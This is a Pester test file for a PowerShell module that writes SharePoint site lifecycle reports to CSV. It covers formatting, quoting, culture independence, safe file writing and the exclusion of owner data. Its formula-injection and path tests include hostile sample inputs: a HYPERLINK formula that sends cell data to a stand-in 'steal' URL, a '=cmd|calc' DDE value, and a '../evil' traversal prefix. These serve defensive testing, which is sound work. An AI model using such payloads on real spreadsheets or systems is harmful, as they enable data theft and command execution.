BeforeAll {
    $manifest = Join-Path -Path $PSScriptRoot -ChildPath '../src/Modules/SPSSiteLifecycle.Common/SPSSiteLifecycle.Common.psd1'
    $script:Module = Import-Module -Name $manifest -Force -PassThru

    $script:Columns = @(
        'Url', 'Verdict', 'SuggestedAction', 'Decision', 'SiteId', 'Title', 'Template', 'GroupId', 'IsTeamsConnected',
        'LockState', 'ArchiveStatus', 'StorageUsedMB', 'LastActivity', 'LastActivitySource', 'InactiveDays',
        'SharePointActivity', 'TeamsActivity', 'GroupActivity', 'ContentModified', 'LockedOn', 'LockedOnSource', 'GeneratedOn'
    )
    $script:GeneratedOn = [System.DateTime]::new(2026, 10, 28, 16, 30, 0, [System.DateTimeKind]::Utc)

    function script:New-TestRecord {
        param([string]$Url = 'https://contoso.sharepoint.com/sites/sales', [string]$Title = 'Sales')
        [PSCustomObject]@{
            Url                = $Url
            Verdict            = 'DELETE-VIA-GROUP'
            SuggestedAction    = 'Delete'
            SiteId             = 'A6E20079-2D1A-4E9D-BC9F-94E3F2EFEB64'
            Title              = $Title
            Template           = 'GROUP#0'
            GroupId            = '{0D7B4EBB-F68C-4F29-8529-5B46655D0C3C}'
            IsTeamsConnected   = $true
            LockState          = 'ReadOnly'
            ArchiveStatus      = 'NotArchived'
            StorageUsedMB      = 1234.5
            LastActivity       = [System.DateTime]::new(2025, 6, 30, 0, 0, 0, [System.DateTimeKind]::Utc)
            LastActivitySource = 'SharePoint'
            InactiveDays       = 486
            SharePointActivity = [System.DateTime]::new(2025, 6, 30, 0, 0, 0, [System.DateTimeKind]::Utc)
            ContentModified    = [System.DateTime]::new(2025, 7, 2, 9, 15, 42, [System.DateTimeKind]::Utc)
            LockedOn           = [System.DateTime]::new(2025, 1, 15, 0, 0, 0, [System.DateTimeKind]::Utc)
            LockedOnSource     = 'lock-dates.csv'
        }
    }

    function script:Invoke-TestExport {
        param($Row, [string]$Folder, [char]$Delimiter = ',', $GeneratedOn = $script:GeneratedOn)
        & $script:Module { param($r, $f, $d, $g) Export-SPSLifecycleReport -Row $r -OutputFolder $f -Delimiter $d -GeneratedOn $g } $Row $Folder $Delimiter $GeneratedOn
    }

    function script:Invoke-TestPipelineExport {
        param($Row, [string]$Folder, [char]$Delimiter = ',', $GeneratedOn = $script:GeneratedOn)
        & $script:Module { param($r, $f, $d, $g) $r | Export-SPSLifecycleReport -OutputFolder $f -Delimiter $d -GeneratedOn $g } $Row $Folder $Delimiter $GeneratedOn
    }

    function script:Get-TestCell {
        param([string]$Kind, $Value)
        & $script:Module { param($k, $v) ConvertTo-SPSLifecycleReportCell -Kind $k -Value $v } $Kind $Value
    }

    function script:New-TestFolder {
        $folder = Join-Path -Path $TestDrive -ChildPath ([guid]::NewGuid().ToString('N'))
        $null = New-Item -Path $folder -ItemType Directory
        $folder
    }
}

Describe 'Get-SPSLifecycleReportColumn' {
    BeforeAll {
        $script:Catalog = @(& $script:Module { Get-SPSLifecycleReportColumn })
    }

    It 'lists the 22 columns of D10, in order' {
        $script:Catalog | Should -HaveCount 22
        ($script:Catalog.Name -join ',') | Should -BeExactly ($script:Columns -join ',')
    }

    It 'describes every column and gives it a known kind' {
        foreach ($column in $script:Catalog) {
            $column.Description | Should -Not -BeNullOrEmpty -Because $column.Name
            $column.Kind | Should -BeIn 'Text', 'Guid', 'Boolean', 'WholeNumber', 'Date', 'Run', 'Blank'
        }
    }

    It 'marks the four columns that the Act phase reads, and only those' {
        $act = @($script:Catalog | Where-Object { $_.ReadByAct } | ForEach-Object { $_.Name } | Sort-Object)

        ($act -join ',') | Should -BeExactly 'Decision,GeneratedOn,SiteId,Url'
    }

    It 'has no owner column, because owners are personal data' {
        $script:Catalog.Name | Should -Not -Contain 'Owners'
        $script:Catalog.Name | Should -Not -Contain 'Owner'
    }
}

Describe 'ConvertTo-SPSLifecycleSafeText' {
    It 'puts an apostrophe before a text that starts with <Name>' -ForEach @(
        @{ Name = 'an equals sign'; Text = '=HYPERLINK("http://example.com","x")' }
        @{ Name = 'a plus sign'; Text = '+1+1' }
        @{ Name = 'a minus sign'; Text = '-2+3' }
        @{ Name = 'an at sign'; Text = '@SUM(A1)' }
        @{ Name = 'a tab'; Text = "`tcmd" }
        @{ Name = 'a carriage return'; Text = "`rcmd" }
    ) {
        $safe = & $script:Module { param($t) ConvertTo-SPSLifecycleSafeText -Text $t } $Text

        $safe | Should -BeExactly ("'" + $Text)
    }

    It 'leaves <Name> as it is' -ForEach @(
        @{ Name = 'a plain title'; Text = 'Sales' }
        @{ Name = 'an accented title'; Text = 'Équipe été' }
        @{ Name = 'a sign in the middle'; Text = 'a=b+c-d@e' }
        @{ Name = 'a space before a sign'; Text = ' =x' }
        @{ Name = 'an apostrophe'; Text = "O'Neil" }
        @{ Name = 'an address'; Text = 'https://contoso.sharepoint.com/sites/a' }
        @{ Name = 'an empty text'; Text = '' }
    ) {
        $safe = & $script:Module { param($t) ConvertTo-SPSLifecycleSafeText -Text $t } $Text

        $safe | Should -BeExactly $Text
    }

    It 'gives an empty text for a null' {
        (& $script:Module { ConvertTo-SPSLifecycleSafeText -Text $null }) | Should -BeExactly ''
    }
}

Describe 'ConvertTo-SPSLifecycleReportCell' {
    Context 'Whatever the culture' -ForEach @(
        @{ Culture = 'en-US' }
        @{ Culture = 'fr-FR' }
        @{ Culture = 'de-DE' }
    ) {
        BeforeEach {
            $script:PreviousCulture = [System.Globalization.CultureInfo]::CurrentCulture
            [System.Globalization.CultureInfo]::CurrentCulture = [System.Globalization.CultureInfo]::GetCultureInfo($Culture)
        }

        AfterEach {
            [System.Globalization.CultureInfo]::CurrentCulture = $script:PreviousCulture
        }

        It 'writes the whole number <Value> as <Expected>' -ForEach @(
            @{ Value = 1234.5; Expected = '1235' }
            @{ Value = 1234.4; Expected = '1234' }
            @{ Value = 0.4; Expected = '0' }
            @{ Value = 0; Expected = '0' }
            @{ Value = 1048576; Expected = '1048576' }
            @{ Value = 1e12; Expected = '1000000000000' }
            @{ Value = '100.7'; Expected = '101' }
            @{ Value = '1E3'; Expected = '1000' }
            @{ Value = [System.Int64]25600000; Expected = '25600000' }
        ) {
            Get-TestCell -Kind WholeNumber -Value $Value | Should -BeExactly $Expected
        }

        It 'writes an empty cell for the number <Name>, which is unknown, never zero' -ForEach @(
            @{ Name = 'null'; Value = $null }
            @{ Name = 'negative'; Value = -5 }
            @{ Name = 'NaN'; Value = [System.Double]::NaN }
            @{ Name = 'infinite'; Value = [System.Double]::PositiveInfinity }
            @{ Name = 'text'; Value = 'unknown' }
            @{ Name = 'blank'; Value = ' ' }
            @{ Name = 'with a decimal comma'; Value = '1,5' }
        ) {
            Get-TestCell -Kind WholeNumber -Value $Value | Should -BeExactly ''
        }

        It 'writes the date <Name> as <Expected>' -ForEach @(
            @{ Name = 'at midnight UTC'; Value = [System.DateTime]::new(2026, 10, 28, 0, 0, 0, [System.DateTimeKind]::Utc); Expected = '2026-10-28' }
            @{ Name = 'with a time'; Value = [System.DateTime]::new(2026, 10, 28, 16, 30, 0, [System.DateTimeKind]::Utc); Expected = '2026-10-28T16:30:00Z' }
            @{ Name = 'with an unspecified kind, taken as UTC'; Value = [System.DateTime]::new(2026, 10, 28, 16, 30, 5); Expected = '2026-10-28T16:30:05Z' }
            @{ Name = 'as an offset date'; Value = [System.DateTimeOffset]::new(2026, 10, 28, 18, 30, 0, [System.TimeSpan]::FromHours(2)); Expected = '2026-10-28T16:30:00Z' }
            @{ Name = 'as an ISO text'; Value = '2026-10-28T16:30:00Z'; Expected = '2026-10-28T16:30:00Z' }
            @{ Name = 'as an ISO day'; Value = '2026-10-28'; Expected = '2026-10-28' }
        ) {
            Get-TestCell -Kind Date -Value $Value | Should -BeExactly $Expected
        }

        It 'writes an empty cell for a missing date' {
            Get-TestCell -Kind Date -Value $null | Should -BeExactly ''
        }

        It 'writes the booleans in invariant words' {
            Get-TestCell -Kind Boolean -Value $true | Should -BeExactly 'True'
            Get-TestCell -Kind Boolean -Value $false | Should -BeExactly 'False'
            Get-TestCell -Kind Boolean -Value $null | Should -BeExactly ''
            Get-TestCell -Kind Boolean -Value 'VRAI' | Should -BeExactly 'True'
            Get-TestCell -Kind Boolean -Value 'FALSCH' | Should -BeExactly 'False'
        }
    }

    It 'converts a local date to UTC' {
        $local = [System.DateTime]::SpecifyKind([System.DateTime]::new(2026, 10, 28, 16, 30, 0), [System.DateTimeKind]::Local)
        $expected = $local.ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ss', [System.Globalization.CultureInfo]::InvariantCulture) + 'Z'
        $expectedCell = if ($local.ToUniversalTime().TimeOfDay -eq [System.TimeSpan]::Zero) { $local.ToUniversalTime().ToString('yyyy-MM-dd') } else { $expected }

        Get-TestCell -Kind Date -Value $local | Should -BeExactly $expectedCell
    }

    It 'refuses a date that is not a date' {
        { Get-TestCell -Kind Date -Value 'tomorrow' } | Should -Throw -ExpectedMessage '*tomorrow*'
    }

    It 'refuses a boolean that is not a boolean' {
        { Get-TestCell -Kind Boolean -Value 'maybe' } | Should -Throw -ExpectedMessage "*'maybe'*"
    }

    It 'normalizes a GUID, and writes an empty cell for an empty one or one that is not a GUID' {
        Get-TestCell -Kind Guid -Value '{A6E20079-2D1A-4E9D-BC9F-94E3F2EFEB64}' | Should -BeExactly 'a6e20079-2d1a-4e9d-bc9f-94e3f2efeb64'
        Get-TestCell -Kind Guid -Value ([guid]'A6E20079-2D1A-4E9D-BC9F-94E3F2EFEB64') | Should -BeExactly 'a6e20079-2d1a-4e9d-bc9f-94e3f2efeb64'
        Get-TestCell -Kind Guid -Value '00000000-0000-0000-0000-000000000000' | Should -BeExactly ''
        Get-TestCell -Kind Guid -Value 'not a guid' | Should -BeExactly ''
        Get-TestCell -Kind Guid -Value $null | Should -BeExactly ''
    }

    It 'neutralizes a text that comes from the tenant' {
        Get-TestCell -Kind Text -Value '=cmd|calc' | Should -BeExactly "'=cmd|calc"
        Get-TestCell -Kind Text -Value 'Sales' | Should -BeExactly 'Sales'
        Get-TestCell -Kind Text -Value $null | Should -BeExactly ''
    }

    It 'writes the run time in the compact form, and never a decision' {
        Get-TestCell -Kind Run -Value $script:GeneratedOn | Should -BeExactly '20261028T163000Z'
        Get-TestCell -Kind Blank -Value 'Delete' | Should -BeExactly ''
    }
}

Describe 'ConvertTo-SPSLifecycleCsvField' {
    It 'writes <Text> with the delimiter <Delimiter> as <Expected>' -ForEach @(
        @{ Text = 'Sales'; Delimiter = ','; Expected = 'Sales' }
        @{ Text = ''; Delimiter = ','; Expected = '' }
        @{ Text = 'a,b'; Delimiter = ','; Expected = '"a,b"' }
        @{ Text = 'a,b'; Delimiter = ';'; Expected = 'a,b' }
        @{ Text = 'a;b'; Delimiter = ';'; Expected = '"a;b"' }
        @{ Text = "a`tb"; Delimiter = "`t"; Expected = "`"a`tb`"" }
        @{ Text = 'say "hi"'; Delimiter = ','; Expected = '"say ""hi"""' }
        @{ Text = "two`r`nlines"; Delimiter = ','; Expected = "`"two`r`nlines`"" }
        @{ Text = "one`nline"; Delimiter = ';'; Expected = "`"one`nline`"" }
        @{ Text = 'Équipe été'; Delimiter = ';'; Expected = 'Équipe été' }
        @{ Text = 'Sales EMEA'; Delimiter = ','; Expected = 'Sales EMEA' }
        @{ Text = ' Sales'; Delimiter = ','; Expected = '" Sales"' }
        @{ Text = 'Sales '; Delimiter = ';'; Expected = '"Sales "' }
        @{ Text = '   '; Delimiter = ','; Expected = '"   "' }
        @{ Text = "`u{00A0}Sales"; Delimiter = ';'; Expected = "`"`u{00A0}Sales`"" }
        @{ Text = "`u{3000}"; Delimiter = ','; Expected = "`"`u{3000}`"" }
    ) {
        $field = & $script:Module { param($t, $d) ConvertTo-SPSLifecycleCsvField -Text $t -Delimiter ([char]$d) } $Text $Delimiter

        $field | Should -BeExactly $Expected
    }
}

Describe 'Export-SPSLifecycleReport' {
    Context 'The file' {
        BeforeAll {
            $script:Folder = New-TestFolder
            $script:Path = Invoke-TestExport -Row @((New-TestRecord), (New-TestRecord -Url 'https://contoso.sharepoint.com/sites/hr' -Title 'HR')) -Folder $script:Folder -Delimiter ';'
            $script:Bytes = [System.IO.File]::ReadAllBytes($script:Path)
            $script:Text = [System.Text.UTF8Encoding]::new($false).GetString($script:Bytes, 3, $script:Bytes.Length - 3)
        }

        It 'is named after the time of the run, in the output folder' {
            Split-Path -Path $script:Path -Parent | Should -BeExactly $script:Folder
            Split-Path -Path $script:Path -Leaf | Should -BeExactly 'sites-20261028T163000Z.csv'
        }

        It 'starts with a UTF-8 byte order mark' {
            $script:Bytes[0] | Should -Be 0xEF
            $script:Bytes[1] | Should -Be 0xBB
            $script:Bytes[2] | Should -Be 0xBF
            $script:Bytes[3] | Should -Not -Be 0xEF
        }

        It 'uses Windows line endings, and ends with one' {
            $script:Text | Should -Match "`r`n`$"
            @([System.Text.RegularExpressions.Regex]::Matches($script:Text, '(?<!\r)\n')) | Should -HaveCount 0
        }

        It 'has the header of D10, with the separator of the settings' {
            $header = ($script:Text -split "`r`n")[0]

            $header | Should -BeExactly ($script:Columns -join ';')
        }

        It 'writes one line per site' {
            @($script:Text -split "`r`n" | Where-Object { $_ }) | Should -HaveCount 3
        }

        It 'formats a whole record' {
            $line = ($script:Text -split "`r`n")[1]
            $expected = @(
                'https://contoso.sharepoint.com/sites/sales', 'DELETE-VIA-GROUP', 'Delete', '', 'a6e20079-2d1a-4e9d-bc9f-94e3f2efeb64', 'Sales', 'GROUP#0',
                '0d7b4ebb-f68c-4f29-8529-5b46655d0c3c', 'True', 'ReadOnly', 'NotArchived', '1235', '2025-06-30', 'SharePoint', '486',
                '2025-06-30', '', '', '2025-07-02T09:15:42Z', '2025-01-15', 'lock-dates.csv', '20261028T163000Z'
            ) -join ';'

            $line | Should -BeExactly $expected
        }
    }

    Context 'The cells that the tool decides' {
        It 'leaves Decision empty, and gives the whole run one GeneratedOn, whatever the record says' {
            $record = New-TestRecord
            $record | Add-Member -NotePropertyName Decision -NotePropertyValue 'Delete'
            $record | Add-Member -NotePropertyName GeneratedOn -NotePropertyValue ([System.DateTime]::new(2000, 1, 1, 0, 0, 0, [System.DateTimeKind]::Utc))
            $path = Invoke-TestExport -Row @($record, (New-TestRecord -Url 'https://contoso.sharepoint.com/sites/hr')) -Folder (New-TestFolder)
            $rows = @(Import-Csv -LiteralPath $path)

            $rows | Should -HaveCount 2
            @($rows.Decision | Where-Object { $_ }) | Should -HaveCount 0
            @($rows.GeneratedOn | Select-Object -Unique) | Should -HaveCount 1
            $rows[0].GeneratedOn | Should -BeExactly '20261028T163000Z'
        }

        It 'writes the run time in UTC when it is given in local time' {
            $local = [System.DateTime]::SpecifyKind([System.DateTime]::new(2026, 10, 28, 16, 30, 0), [System.DateTimeKind]::Local)
            $path = Invoke-TestExport -Row @((New-TestRecord)) -Folder (New-TestFolder) -GeneratedOn $local
            $expected = $local.ToUniversalTime().ToString('yyyyMMddTHHmmss', [System.Globalization.CultureInfo]::InvariantCulture) + 'Z'

            (Import-Csv -LiteralPath $path).GeneratedOn | Should -BeExactly $expected
            Split-Path -Path $path -Leaf | Should -BeExactly "sites-$expected.csv"
        }
    }

    Context 'The columns' {
        It 'writes an empty cell for a property that the record does not have' {
            $record = [PSCustomObject]@{ Url = 'https://contoso.sharepoint.com/sites/a'; Verdict = 'SKIP-PROTECTED' }
            $path = Invoke-TestExport -Row @($record) -Folder (New-TestFolder)
            $row = Import-Csv -LiteralPath $path

            $row.Url | Should -BeExactly 'https://contoso.sharepoint.com/sites/a'
            $row.Verdict | Should -BeExactly 'SKIP-PROTECTED'
            $row.Title | Should -BeExactly ''
            $row.StorageUsedMB | Should -BeExactly ''
        }

        It 'reads a record that is a hashtable or an ordered dictionary, and does not drop its fields' {
            $hashtable = @{ Url = 'https://contoso.sharepoint.com/sites/a'; SiteId = 'A6E20079-2D1A-4E9D-BC9F-94E3F2EFEB64'; Title = 'Sales'; StorageUsedMB = 12.4; Owners = 'someone@contoso.com' }
            $ordered = [ordered]@{ Url = 'https://contoso.sharepoint.com/sites/b'; Title = 'HR'; IsTeamsConnected = $true }
            $path = Invoke-TestExport -Row @($hashtable, $ordered) -Folder (New-TestFolder)
            $rows = @(Import-Csv -LiteralPath $path)

            $rows | Should -HaveCount 2
            $rows[0].Url | Should -BeExactly 'https://contoso.sharepoint.com/sites/a'
            $rows[0].SiteId | Should -BeExactly 'a6e20079-2d1a-4e9d-bc9f-94e3f2efeb64'
            $rows[0].Title | Should -BeExactly 'Sales'
            $rows[0].StorageUsedMB | Should -BeExactly '12'
            $rows[1].Url | Should -BeExactly 'https://contoso.sharepoint.com/sites/b'
            $rows[1].Title | Should -BeExactly 'HR'
            $rows[1].IsTeamsConnected | Should -BeExactly 'True'
            (Get-Content -LiteralPath $path -Raw) | Should -Not -Match 'someone@contoso.com'
        }

        It 'never writes a property that is not a column, the owners above all' {
            $record = New-TestRecord
            $record | Add-Member -NotePropertyName Owners -NotePropertyValue 'someone@contoso.com'
            $record | Add-Member -NotePropertyName OwnerEmail -NotePropertyValue 'someone@contoso.com'
            $path = Invoke-TestExport -Row @($record) -Folder (New-TestFolder)
            $text = Get-Content -LiteralPath $path -Raw

            $text | Should -Not -Match 'someone@contoso.com'
            $text | Should -Not -Match 'Owner'
        }

        It 'writes only the header for no site' {
            $path = Invoke-TestExport -Row @() -Folder (New-TestFolder)
            $lines = @(Get-Content -LiteralPath $path)

            $lines | Should -HaveCount 1
            $lines[0].TrimStart([char]0xFEFF) | Should -BeExactly ($script:Columns -join ',')
        }
    }

    Context 'Where it writes' {
        It 'creates the output folder, and its parents, when they are missing' {
            $folder = Join-Path -Path (New-TestFolder) -ChildPath 'a/b/Reports'

            $path = Invoke-TestExport -Row @((New-TestRecord)) -Folder $folder

            Test-Path -LiteralPath $path | Should -BeTrue
        }

        It 'never overwrites a file, and says so' {
            $folder = New-TestFolder
            $first = Invoke-TestExport -Row @((New-TestRecord)) -Folder $folder
            $before = [System.IO.File]::ReadAllBytes($first)

            { Invoke-TestExport -Row @((New-TestRecord -Title 'Another')) -Folder $folder } | Should -Throw -ExpectedMessage '*already exists*'

            [System.IO.File]::ReadAllBytes($first).Length | Should -Be $before.Length
            (Get-Content -LiteralPath $first -Raw) | Should -Not -Match 'Another'
        }

        It 'writes a different file for another second' {
            $folder = New-TestFolder
            $one = Invoke-TestExport -Row @((New-TestRecord)) -Folder $folder
            $two = Invoke-TestExport -Row @((New-TestRecord)) -Folder $folder -GeneratedOn $script:GeneratedOn.AddSeconds(1)

            $one | Should -Not -BeExactly $two
            @(Get-ChildItem -LiteralPath $folder -Filter 'sites-*.csv') | Should -HaveCount 2
        }

        It 'leaves only the report in the folder, with no partial file' {
            $folder = New-TestFolder
            $path = Invoke-TestExport -Row @((New-TestRecord), (New-TestRecord -Url 'https://contoso.sharepoint.com/sites/b')) -Folder $folder

            @(Get-ChildItem -LiteralPath $folder -Force | ForEach-Object FullName) | Should -BeExactly @($path)
        }

        It 'names the row that it cannot write, and leaves nothing on disk' {
            $folder = New-TestFolder
            $bad = New-TestRecord -Url 'https://contoso.sharepoint.com/sites/bad'
            $bad.LastActivity = 'not a date'
            $rows = @((New-TestRecord), $bad, (New-TestRecord -Url 'https://contoso.sharepoint.com/sites/c'))

            { Invoke-TestExport -Row $rows -Folder $folder } | Should -Throw -ExpectedMessage '*row 2*https://contoso.sharepoint.com/sites/bad*'

            @(Get-ChildItem -LiteralPath $folder -Force) | Should -HaveCount 0 -Because 'a report that stops half-way must not look like a complete one'
        }

        It 'never replaces a report that appears while it writes, and leaves no partial file' {
            $folder = New-TestFolder
            $script:RacePath = Join-Path -Path $folder -ChildPath 'sites-20261028T163000Z.csv'
            $record = New-TestRecord
            $record | Add-Member -MemberType ScriptProperty -Name Title -Force -Value { [System.IO.File]::WriteAllText($script:RacePath, 'reviewed'); 'Sales' }

            { Invoke-TestExport -Row @($record) -Folder $folder } | Should -Throw -ExpectedMessage '*already exists*'

            [System.IO.File]::ReadAllText($script:RacePath) | Should -BeExactly 'reviewed'
            @(Get-ChildItem -LiteralPath $folder -Force) | Should -HaveCount 1
        }

        It 'writes a character that UTF-8 cannot hold as U+FFFD, and keeps the rest of the report' {
            $odd = New-TestRecord -Title ('x' + [char]0xD800 + 'y')
            $path = Invoke-TestExport -Row @($odd, (New-TestRecord -Url 'https://contoso.sharepoint.com/sites/b' -Title 'HR')) -Folder (New-TestFolder)
            $rows = @(Import-Csv -LiteralPath $path)

            $rows | Should -HaveCount 2
            $rows[0].Title | Should -BeExactly "x`u{FFFD}y"
            $rows[1].Title | Should -BeExactly 'HR'
        }

        It 'refuses a delimiter that is not a comma, a semicolon or a tab' {
            { Invoke-TestExport -Row @((New-TestRecord)) -Folder (New-TestFolder) -Delimiter '|' } | Should -Throw
        }

        It 'refuses a file name prefix that could leave the folder' {
            { & $script:Module { param($f, $g) Export-SPSLifecycleReport -Row @() -OutputFolder $f -GeneratedOn $g -Prefix '../evil' } (New-TestFolder) $script:GeneratedOn } | Should -Throw
        }
    }

    Context 'Records from the pipeline' {
        It 'writes the same file as the same records given as an array' {
            $records = @((New-TestRecord), (New-TestRecord -Url 'https://contoso.sharepoint.com/sites/hr' -Title 'HR'))
            $fromArray = Invoke-TestExport -Row $records -Folder (New-TestFolder)
            $fromPipeline = Invoke-TestPipelineExport -Row $records -Folder (New-TestFolder)

            [System.IO.File]::ReadAllBytes($fromPipeline) | Should -Be ([System.IO.File]::ReadAllBytes($fromArray))
        }

        It 'writes only the header for an empty pipeline' {
            $path = Invoke-TestPipelineExport -Row @() -Folder (New-TestFolder)

            @(Get-Content -LiteralPath $path) | Should -HaveCount 1
        }

        It 'stops at the record that cannot be written, and leaves nothing on disk' {
            $folder = New-TestFolder
            $bad = New-TestRecord -Url 'https://contoso.sharepoint.com/sites/bad'
            $bad.LastActivity = 'not a date'

            { Invoke-TestPipelineExport -Row @((New-TestRecord), $bad, (New-TestRecord)) -Folder $folder } | Should -Throw -ExpectedMessage '*row 2*'

            @(Get-ChildItem -LiteralPath $folder -Force) | Should -HaveCount 0
        }
    }

    Context 'Formula injection' {
        It 'keeps a title that Excel would run as a formula from being one: <Title>' -ForEach @(
            @{ Title = '=HYPERLINK("http://example.com/steal?x="&A1,"click")' }
            @{ Title = '+SUM(1+1)' }
            @{ Title = '-2+3' }
            @{ Title = '@SUM(A1:A9)' }
            @{ Title = "`t=1+1" }
        ) {
            $path = Invoke-TestExport -Row @((New-TestRecord -Title $Title)) -Folder (New-TestFolder)
            $row = Import-Csv -LiteralPath $path

            $row.Title | Should -BeExactly ("'" + $Title)
        }

        It 'does the same for every text column that comes from the tenant' {
            $record = New-TestRecord
            $record.Template = '=1+1'
            $record.LockState = '@x'
            $record.LastActivitySource = '+y'
            $record.LockedOnSource = '-z'
            $path = Invoke-TestExport -Row @($record) -Folder (New-TestFolder)
            $row = Import-Csv -LiteralPath $path

            $row.Template | Should -BeExactly "'=1+1"
            $row.LockState | Should -BeExactly "'@x"
            $row.LastActivitySource | Should -BeExactly "'+y"
            $row.LockedOnSource | Should -BeExactly "'-z"
        }
    }

    Context 'A round trip through the reader, whatever the culture and the separator' -ForEach @(
        @{ Culture = 'en-US' }
        @{ Culture = 'fr-FR' }
        @{ Culture = 'de-DE' }
    ) {
        BeforeEach {
            $script:PreviousCulture = [System.Globalization.CultureInfo]::CurrentCulture
            [System.Globalization.CultureInfo]::CurrentCulture = [System.Globalization.CultureInfo]::GetCultureInfo($Culture)
        }

        AfterEach {
            [System.Globalization.CultureInfo]::CurrentCulture = $script:PreviousCulture
        }

        It 'reads back what it wrote with the delimiter <Name>' -ForEach @(
            @{ Name = 'comma'; Delimiter = [char]',' }
            @{ Name = 'semicolon'; Delimiter = [char]';' }
            @{ Name = 'tab'; Delimiter = [char]"`t" }
        ) {
            $titles = @(
                'Équipe été',
                'Sales; EMEA, 2026',
                'He said "hello"',
                "Two`r`nlines",
                '=HYPERLINK("x")',
                "Tab`tinside",
                'Straße Ünïcödé 日本',
                ' Leading space',
                'Trailing space ',
                '   ',
                "`u{00A0}Leading no-break space"
            )
            $records = @($titles | ForEach-Object -Begin { $i = 0 } -Process { $i++; New-TestRecord -Url "https://contoso.sharepoint.com/sites/site$i" -Title $_ })
            $path = Invoke-TestExport -Row $records -Folder (New-TestFolder) -Delimiter $Delimiter

            $rows = @(& $script:Module { param($p) Read-SPSLifecycleCsv -Path $p -RequiredColumn 'Url', 'SiteId', 'Decision', 'GeneratedOn' } $path)

            $rows | Should -HaveCount $titles.Count
            for ($index = 0; $index -lt $titles.Count; $index++) {
                $expected = if ($titles[$index] -match '^[=+\-@]') { "'" + $titles[$index] } else { $titles[$index] }
                $rows[$index].Title | Should -BeExactly $expected
                $rows[$index].Url | Should -BeExactly "https://contoso.sharepoint.com/sites/site$($index + 1)"
                $rows[$index].SiteId | Should -BeExactly 'a6e20079-2d1a-4e9d-bc9f-94e3f2efeb64'
                $rows[$index].StorageUsedMB | Should -BeExactly '1235'
                $rows[$index].Decision | Should -BeExactly ''
                $rows[$index].GeneratedOn | Should -BeExactly '20261028T163000Z'
            }

            @($rows[0].PSObject.Properties.Name) -join ',' | Should -BeExactly ($script:Columns -join ',')
        }

        It 'writes dates that the tool reads again, and that never depend on the culture' {
            $path = Invoke-TestExport -Row @((New-TestRecord)) -Folder (New-TestFolder) -Delimiter ';'
            $row = @(& $script:Module { param($p) Read-SPSLifecycleCsv -Path $p -RequiredColumn 'Url' } $path)[0]

            $row.LastActivity | Should -BeExactly '2025-06-30'
            $row.ContentModified | Should -BeExactly '2025-07-02T09:15:42Z'
            (& $script:Module { param($t) ConvertTo-SPSLifecycleDate -Text $t } $row.ContentModified).ToString('o') | Should -Be '2025-07-02T09:15:42.0000000Z'
            (& $script:Module { param($t) ConvertTo-SPSLifecycleDate -Text $t } $row.GeneratedOn).ToString('o') | Should -Be '2026-10-28T16:30:00.0000000Z'
        }
    }

    Context 'Size' {
        It 'writes 20,000 sites in a reasonable time' {
            $records = foreach ($i in 1..20000) { New-TestRecord -Url "https://contoso.sharepoint.com/sites/site$i" -Title "Site $i" }
            $watch = [System.Diagnostics.Stopwatch]::StartNew()
            $path = Invoke-TestExport -Row @($records) -Folder (New-TestFolder) -Delimiter ';'
            $watch.Stop()

            @(Get-Content -LiteralPath $path).Count | Should -Be 20001
            $watch.Elapsed.TotalSeconds | Should -BeLessThan 60
        }
    }
}
